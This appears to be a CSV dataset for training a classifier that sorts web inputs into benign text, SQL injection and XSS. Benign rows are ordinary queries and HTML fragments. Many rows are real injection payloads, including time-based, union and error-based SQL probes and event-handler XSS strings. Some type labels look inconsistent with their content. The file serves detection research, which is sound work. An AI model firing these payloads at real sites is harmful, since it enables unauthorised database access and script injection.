Text,Label,type
 </li>,0,xss
SELECT * FROM bean WHERE raw IN  ( SELECT engineer FROM deer ) ,0,sql
"  SELECT * FROM tail WHERE wet IN  ( 'court', 'birth', 'image' )  ",0,sql
SELECT * FROM surface WHERE lot = 'beside'  OR involved = 'common',0,sql
"<li onmousemove=""alert(1)"">test</li>",2,xss
<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>,2,xss
76971829y,0,sql
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onanimationstart=""alert(1)""></figure>",2,xss
"<img draggable=""true"" ondragend=""alert(1)"">test</img>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"<dt onclick=""alert(1)"">test</dt>",2,xss
isidro,0,sql
"<area onmouseover=""alert(1)"">test</area>",2,xss
"<li><a href=""/wiki/Robotic_paradigm"" title=""Robotic paradigm"">Paradigms </a> </li>",0,xss
1   )    )    and 4595  =  4595#,1,xss
saprtich@seramitex.sv,0,sql
zool7ic1,0,sql
"1""   )    )     )   and 7135  =  8805#",1,sql
1'||  (  select 'ezse' from dual where 3821  =  3821,1,sql
1'  )   as eyzk where 2489  =  2489 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,sql
<noscript onpointerup=alert(1)>XSS</noscript>,2,xss
SELECT * FROM job WHERE wash = 'floating' FETCH FIRST 3 ROWS ONLY,0,sql
1  )   as ywrn where 1893  =  1893,1,xss
<body onafterprint=alert(1)>,2,xss
SELECT * FROM real,0,sql
"-7248""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""qgms""  =  ""qgms",1,sql
 ,0,xss
"<body onmouseup=""alert(1)"">test</body>",2,xss
"<var onkeypress=""alert(1)"" contenteditable>test</var>",2,xss
"<li id=""cite_note-72""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-72"">^ </a> </b> ",0,xss
SELECT * FROM arrange WHERE function NOT LIKE '[accept]%',0,sql
"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",1,sql
<textarea onfocusout=alert(1) id=x></textarea><input autofocus>,2,xss
"<li><a href=""/wiki/Max_Tegmark"" title=""Max Tegmark"">Max Tegmark </a> </li>",0,xss
{s,1,sql
mullinar_lemanska@gallegonicolas.ps,0,xss
"camino del caliero, 75",0,sql
"""><iframe src=""javascript:alert()"">",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
 ,0,xss
"<h2><span class=""mw-headline"" id=""Further_reading"">Further reading ",0,xss
SELECT * FROM signal FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
ive,0,xss
	 </span>,0,xss
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'jryo'  =  'jryo,1,sql
"1   )    )    as rqbo where 2243  =  2243 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,xss
      </nav>,0,xss
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,sql
"<li id=""cite_note-326""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-326"">^ </a> </b> ",0,xss
" SELECT COUNT ( CustomerID ) , Country FROM Customers GROUP BY Country;",0,sql
6053,0,xss
1'||  (  select 'pyga' from dual where 8501  =  8501 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",1,sql
4.97885E+15,0,sql
" SELECT * FROM combination ORDER BY dark, pile",0,sql
"<base draggable=""true"" ondragend=""alert(1)"">test</base>",2,xss
patay,0,xss
"  SELECT occasionally,younger FROM mass WHERE thou = 'trip' UNION SELECT stretch, engineer FROM certain",0,sql
SELECT AVG ( trip )  FROM relationship  SELECT SUM ( wild ) ,0,sql
SELECT COUNT ( wise )  FROM dozen,0,xss
SELECT TOP 50 PERCENT * FROM honor SELECT * FROM dog FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM steep,0,sql
SELECT * FROM mass WHERE mental NOT LIKE '[mysterious]%',0,xss
	 <div>,0,xss
<image onpointermove=alert(1)>XSS</image>,2,xss
"<style>:target {transform: rotate(180deg);}</style><del id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></del>",2,xss
document.scripts.length,2,xss
segura reygadas,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/tutorial.html"">Scrapy Tutorial</a></li>",0,xss
"1%""   )    )     )   union all select null,null,null,null,null,null,null--",1,sql
"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",2,xss
1  )   where 8433  =  8433 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,sql
2719,0,sql
-3535%'   )    )     )   or 5605  =  4660 and    (    (     (  '%'  =  ',1,sql
"			<input type=""hidden"" value=""Special:Search"" name=""title""/>",0,xss
SELECT * FROM climate WHERE oldest BETWEEN thin09/01/1996behind AND apart15/31/1996came,0,sql
SELECT * FROM wp_posts WHERE ID  =  28694 LIMIT 1,0,sql
SELECT MIN ( right )  AS wool FROM if,0,xss
"<multicol onkeypress=""alert(1)"" contenteditable>test</multicol>",2,xss
1  )   where 8616  =  8616 and 2006  =  2006,1,sql
SELECT space FROM garden,0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><s id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></s>",2,xss
cenheg,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"<p><a href=""/wiki/Machine_perception"" title=""Machine perception"">Machine perception </a><sup id=""cite_ref-Machine_perception_124-0"" class=""reference""><a href=""#cite_note-Machine_perception-124"">&#91;121&#93; </a> </sup> is the ability to use input from sensors (such as cameras (visible spectrum or infrared), microphones, wireless signals, and active <a href=""/wiki/Lidar"" title=""Lidar"">lidar </a>, sonar, radar, and <a href=""/wiki/Tactile_sensor"" title=""Tactile sensor"">tactile sensors </a>) to deduce aspects of the world. Applications include <a href=""/wiki/Speech_recognition"" title=""Speech recognition"">speech recognition </a>,<sup id=""cite_ref-Speech_recognition_125-0"" class=""reference""><a href=""#cite_note-Speech_recognition-125"">&#91;122&#93; </a> </sup> <a href=""/wiki/Facial_recognition_system"" title=""Facial recognition system"">facial recognition </a>, and <a href=""/wiki/Object_recognition"" class=""mw-redirect"" title=""Object recognition"">object recognition </a>.<sup id=""cite_ref-Object_recognition_126-0"" class=""reference""><a href=""#cite_note-Object_recognition-126"">&#91;123&#93; </a> </sup> <a href=""/wiki/Computer_vision"" title=""Computer vision"">Computer vision </a> is the ability to analyze visual input. Such input is usually ambiguous; a giant, fifty-meter-tall pedestrian far away may produce exactly the same pixels as a nearby normal-sized pedestrian, requiring the AI to judge the relative likelihood and reasonableness of different interpretations, for example by using its ""object model"" to assess that fifty-meter pedestrians do not exist.<sup id=""cite_ref-Computer_vision_127-0"" class=""reference""><a href=""#cite_note-Computer_vision-127"">&#91;124&#93; </a> </sup>",0,xss
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Emerging_technologies_in_information_and_communications"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"" style=""text-align: center;"">",0,xss
"<li><a href=""/wiki/Unmanned_vehicle"" title=""Unmanned vehicle"">Unmanned vehicle </a>",0,xss
"SELECT * FROM baseball WHERE elephant BETWEEN ""suppose"" AND    ""gas""",0,sql
"<li id=""cite_note-296""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-296"">^ </a> </b> ",0,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""rugr""  =  ""rugr",1,sql
SELECT AVG ( dull ) FROM view SELECT SUM ( unhappy ) ,0,sql
<img srcset=validimage.png onload=alert(1)>,2,xss
SELECT * FROM natural WHERE piece NOT LIKE 'roar%',0,sql
SELECT screen ( s )  FROM grandmother LEFT JOIN,0,sql
merida@elsentidodelavida.nc,0,sql
SELECT SQRT ( 64 ) ;,0,xss
<picture onpointerover=alert(1)>XSS</picture>,2,xss
"-3007  )   where 6648  =  6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",1,sql
"<col draggable=""true"" ondragenter=""alert(1)"">test</col>",2,xss
 </li>,0,xss
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;381–394 </li> </ul>",0,xss
solter@aclub.com.ke,0,sql
rosselot azcona,0,sql
"	<ul id=""footer-info"" class="""">",0,xss
"1%""  )   and sleep  (  5  )   and   (  ""%""  =  """,1,sql
<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>,2,xss
cantoria,0,xss
SELECT * FROM interior WHERE themselves = 'compare'  OR verb = 'rain',0,sql
 ,0,xss
tenna1,0,sql
"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",2,xss
acre,0,sql
<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>,2,xss
SELECT * FROM private WHERE mental IN  ( SELECT thousand FROM silence ) ,0,sql
"1   )    )    as shmg where 1371  =  1371 union all select null,null,null,null,null,null,null,null,null,null#",1,sql
DELETE FROM label,0,sql
calzada rebassa,0,sql
"<hgroup onmousedown=""alert(1)"">test</hgroup>",2,xss
SELECT * FROM let ORDER BY wave,0,sql
select   (  case when   (  3435  =  4011  )   then 1 else 3435*  (  select 3435 from master..sysdatabases  )   end  )  --,1,sql
5788,0,xss
"  SELECT Orders.avoidrID, Employees.temperature, Employees.cover FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.baseID ORDER BY Orders.orderID",0,sql
puente la reina/gares,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Prakken, Henry (31 August 2017). ""On the problem of making autonomous vehicles conform to traffic law"". <i>Artificial Intelligence and Law </i>. <b>25 </b> (3): 341–363. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2Fs10506-017-9210-0"">10.1007/s10506-017-9210-0 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Artificial+Intelligence+and+Law&amp;rft.atitle=On+the+problem+of+making+autonomous+vehicles+conform+to+traffic+law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info%3Adoi%2F10.1007%2Fs10506-017-9210-0&amp;rft.aulast=Prakken&amp;rft.aufirst=Henry&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT Count ( * )  AS growth,0,sql
"<map onbeforecopy=""alert(1)"" contenteditable>test</map>",2,xss
SELECT * FROM handsome FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM over,0,sql
"-6770"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",1,sql
 </li>,0,xss
"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",1,sql
-8515' or 1329  =  9536,1,sql
SELECT AVG ( crack ) FROM lost SELECT SUM ( paper ) ,0,sql
correa cachopo,0,xss
"<style>:target {transform: rotate(180deg);}</style><body id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></body>",2,xss
" select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",1,sql
"-5757%""  )   or 6872  =  6872 and   (  ""%""  =  """,1,sql
"<colgroup draggable=""true"" ondragend=""alert(1)"">test</colgroup>",2,xss
"  SELECT * FROM independent WHERE forty NOT IN  ( 'rays', 'bone', 'swung' )  ",0,xss
"<ul><li><a href=""/wiki/3D_optical_data_storage"" title=""3D optical data storage"">3D optical data storage </a> </li>",0,xss
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'zjun'  =  'zjun,1,sql
SELECT * FROM ocean 3,0,xss
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,sql
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1,sql
"1'+  (  select bptu where 7356  =  7356   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1,xss
"   SELECT busy, invented, chief FROM view WHERE tool  IS NULL",0,sql
"c/ venus 91, 1e",0,sql
SELECT TOP 3 * FROM suppose SELECT * FROM stairs 3SELECT * FROM sharp,0,sql
or 1  =  1 /*,1,sql
"<li><a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">rtificial general intelligence </a> </li> </ul> </td>",0,xss
SELECT themselves FROM riding UNION ALL SELECT might FROM rose ORDER BY dangerous,0,sql
select sleep  (  5  )  --,1,sql
1' where 5455  =  5455 and sleep  (  5  )  --,1,xss
"1""   )    )     )   union all select null,null,null,null,null--",1,sql
"<p>Many problems in AI (in reasoning, planning, learning, perception, and robotics) require the agent to operate with incomplete or uncertain information. AI researchers have devised a number of powerful tools to solve these problems using methods from <a href=""/wiki/Probability"" title=""Probability"">probability </a> theory and economics.<sup id=""cite_ref-Stochastic_methods_for_uncertain_reasoning_204-0"" class=""reference""><a href=""#cite_note-Stochastic_methods_for_uncertain_reasoning-204"">&#91;199&#93; </a> </sup>",0,xss
"1  )   union all select null,null,null,null,null,null,null--",1,sql
equivalentemente,0,sql
1%'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  '%'  =  ',1,sql
62386870z,0,sql
1%' union all select null#,1,sql
-3059'  )   as jhbh where 4056  =  4056 or   (  3498  =  6965  )  *6965--,1,sql
522lta,0,xss
baladora,0,sql
"iif  (  1878  =  2513,1,1/0  )  ",1,sql
"<bdo ondblclick=""alert(1)"">test</bdo>",2,xss
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,sql
uni/**/on sel/**/ect,1,sql
"INSERT INTO loose  ( exercise, struck, chosen )  VALUES  ( 'yet', 'importance', 'tomorrow' )  ",0,sql
"<style>@keyframes x{}</style><meta style=""animation-name:x"" onanimationstart=""alert(1)""></meta>",2,xss
" SELECT column_name ( s )  FROM slight,according",0,sql
SELECT scientific FROM many,0,sql
roda deita,0,sql
SELECT * FROM evidence WHERE inch NOT BETWEEN 'her' AND 'low',0,sql
<tt onpointerup=alert(1)>XSS</tt>,2,xss
"  SELECT INSERT ( ""W3Schools.com"", 1, 9, ""Example"" ) ;",0,sql
"-4947' in boolean mode  )   union all select 3314,3314#",1,xss
"-7006' where 6966  =  6966 union all select 6966,6966,6966,6966#",1,sql
"   SELECT moment, army, silkFROM task WHERE carried  IS NOT NULL",0,xss
5718,0,sql
1'||  (  select 'omeg' from dual where 4751  =  4751,1,sql
25254382z,0,xss
"1%' or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
26133,0,sql
SELECT * FROM join,0,sql
SELECT * FROM man WHERE prove IN  ( SELECT are FROM way ) ,0,sql
-2291   )    )    or 4067  =  5666#,1,sql
"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",1,xss
"<strike onkeydown=""alert(1)"" contenteditable>test</strike>",2,xss
SELECT AVG ( mark ) FROM crew SELECT SUM ( mine ) ,0,sql
SELECT TOP 3 * FROM arrangement WHERE blow = 'watch' SELECT * FROM longer,0,sql
pl. heroes de espaa 20 11?g,0,xss
"<style>@keyframes x{}</style><nextid style=""animation-name:x"" onanimationend=""alert(1)""></nextid>",2,xss
1'||  (  select 'lvso' where 5675  =  5675,1,sql
"  SELECT Orders.automobilerID, Employees.pure, Employees.just FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fastID ORDER BY Orders.richID",0,xss
SELECT COUNT ( damageID ) FROM foreign,0,sql
kokoska1,0,sql
1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,1,sql
Biological intelligence vs. intelligence in general:,0,xss
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'yqzg'  =  'yqzg",1,sql
<a onpointerout=alert(1)>XSS</a>,2,xss
"<li id=""cite_note-175""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-175"">^ </a> </b> ",0,xss
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'fjfo'  =  'fjfo",1,sql
"INSERT INTO available  ( doctor, sleep, happened )  VALUES  ( 'lay', 'wrapped', 'function' )  ",0,sql
SELECT * FROM clear  WHERE continued = how,0,xss
"SELECT column1, column2, ... FROM table_name WHERE columnN LIKE pattern ;",0,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
19332,0,sql
65782684q,0,xss
<s id=x tabindex=1 onbeforeactivate=alert(1)></s>,2,xss
SELECT * FROM wp_houzez_crm_viewed_listings WHERE listing_id  =  27990 AND user_id  =  0,0,sql
SELECT * FROM depth WHERE since BETWEEN 'supper' AND 'rope',0,xss
	 </span> </a> </li>,0,xss
1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,1,xss
if  (  9770  =  9748  )   select 9770 else drop function zyuo--,1,sql
deighton_pfaudler@ajuntamentdebarcelona20.vn,0,sql
9667,0,xss
"<ins onbeforecut=""alert(1)"" contenteditable>test</ins>",2,xss
22122,0,xss
-7209'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'stqx'  =  'stqx,1,sql
16c64si30,0,sql
"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",1,sql
5.26636E+15,0,sql
"<li><a href=""/wiki/Gaussian_adaptation"" title=""Gaussian adaptation"">Gaussian adaptation </a> </li>",0,xss
SELECT * FROM chapter,0,sql
zarra,0,sql
cuz,0,sql
jalance,0,sql
c/ torre de romo s/n 1f,0,sql
"<IMG SRC=""jav&#x0D;ascript:alert('');"">",2,xss
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""%""  =  """,1,sql
SELECT * FROM attention WHERE task  BETWEEN 10 AND 20,0,sql
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationend=""alert(1)""></element>",2,xss
"<dt oncut=""alert(1)"" contenteditable>test</dt>",2,xss
"          <dd><a href=""//docs.scrapy.org/_/downloads/en/latest/epub/"">epub</a></dd>       ",0,xss
"<legend oncopy=""alert(1)"" contenteditable>test</legend>",2,xss
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,2,xss
poca urzagaste,0,sql
"  SELECT * FROM change WHERE newspaper IN  ( 'caught', 'ahead', 'pie' )  ",0,sql
granach@mccomptables.be,0,sql
"	 </span> <span class=""toctext"">Automotive ",0,xss
<output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>,2,xss
banerjee6@getgold.ec,0,sql
"<var onkeydown=""alert(1)"" contenteditable>test</var>",2,xss
9.00454E+15,0,sql
"-2340%"" order by 1#",1,sql
"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",1,sql
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;414–416, </li>",0,xss
"<li id=""cite_note-recurse-409""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-recurse_409-0"">^ </a> </b> ",0,xss
DELETE FROM stared WHERE system = 'whole',0,sql
SELECT * FROM south WHERE week BETWEEN nor09/01/1996apple AND growth15/31/1996thus,0,sql
SELECT TOP 3 * FROM people WHERE sheep = 'tube' SELECT * FROM enemy,0,sql
"1"" where 9919  =  9919",1,sql
<shadow id=x tabindex=1 onfocus=alert(1)></shadow>,2,xss
SELECT column_name FROM table_name WHERE condition GROUP BY column_name HAVING condition ORDER BY  column_name;,0,sql
"<ul><li><a href=""/wiki/Supervised_learning"" title=""Supervised learning"">Supervised learning </a> </li>",0,xss
burns40,0,sql
"<option draggable=""true"" ondragleave=""alert(1)"">test</option>",2,xss
raspar,0,xss
1 where 8135  =  8135,1,sql
<img id=x tabindex=1 onfocus=alert(1)></img>,2,xss
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,sql
SELECT * FROM nearer WHERE NOT useful = 'sold'  AND NOT example = 'circle',0,xss
<nav id=x tabindex=1 onbeforeactivate=alert(1)></nav>,2,xss
          <dd>,0,xss
07u8e37ia,0,sql
"<param oncopy=""alert(1)"" contenteditable>test</param>",2,xss
"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,xss
"-5963"" or 9323  =  9323#",1,sql
FROM  ( SELECT DISTINCT bare FROM although ) ,0,sql
SELECT cattle FROM look UNION SELECT adjective FROM piano ORDER BY family,0,sql
"<label onmousemove=""alert(1)"">test</label>",2,xss
"-9175'   )    )    union all select 6174,6174,6174,6174--",1,sql
"-5124'+  (  select 'xpww' where 1752  =  1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",1,sql
"  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">",0,xss
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq",1,sql
/,1,xss
"<li class=""toclevel-2 tocsection-11""><a href=""#Motion_and_manipulation""><span class=""tocnumber"">4.7 ",0,xss
"1""  )   as wjdc where 8694  =  8694 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,xss
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onanimationend=""alert(1)""></dt>",2,xss
1'  )   as hqaq where 6411  =  6411 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
<textarea oninput=alert(1)>XSS</textarea>,2,xss
"  SELECT mayID AS ID, scientist AS rear FROM tall",0,xss
SELECT * FROM price WHERE stems BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"  SELECT * FROM black WHERE paint NOT IN  ( 'visitor', 'swim', 'raise' )  ",0,sql
montroy,0,sql
"  SELECT seasonID AS ID, means AS known FROM weigh",0,sql
"1""   )    )    as vtad where 3653  =  3653 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
<strike onpointerenter=alert(1)>XSS</strike>,2,xss
"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",2,xss
"1'  )   and make_set  (  9961  =  6559,6559  )   and   (  'exde'  =  'exde",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",1,xss
&,1,sql
15107,0,sql
"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",1,sql
SELECT * FROM probably WHERE more LIKE '%desert%',0,sql
"<style>:target {color:red;}</style><ins id=x style=""transition:color 1s"" ontransitionend=alert(1)></ins>",2,xss
SELECT COUNT ( helloID ) FROM wall,0,xss
5.82525E+15,0,sql
end  )  +',1,sql
monteys bold,0,xss
18452,0,sql
SELECT MIN ( safety )  AS ancient FROM present,0,xss
-6637'   )    )    order by 1#,1,sql
"   SELECT underline,in,whispered,eight,brave     (  (  command JOIN rise ON jar.bank =  strong.heavy )   INNER JOIN oceanON Orders.crew =  frighten.chanceID ) ",0,sql
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 18.3 </li> </ul>",0,xss
"   SELECT Employees.can, COUNT ( Orders.shakingID )  AS waitFROM    ( OrdersINNER JOIN dull ON Orders.tiredID  =  Employees.saddleID ) ",0,sql
SELECT * FROM massage WHERE happened  BETWEEN 10 AND 20,0,sql
"1  )   as nlig where 5964  =  5964 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
"1"" where 2394  =  2394 and 8831  =  8333--",1,sql
"<optgroup onmouseout=""alert(1)"">test</optgroup>",2,xss
"<style>:target {transform: rotate(180deg);}</style><thead id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></thead>",2,xss
"<div onclick=""alert(1)"">test</div>",2,xss
"<noframes onmouseout=""alert(1)"">test</noframes>",2,xss
javascript:alert('');,2,xss
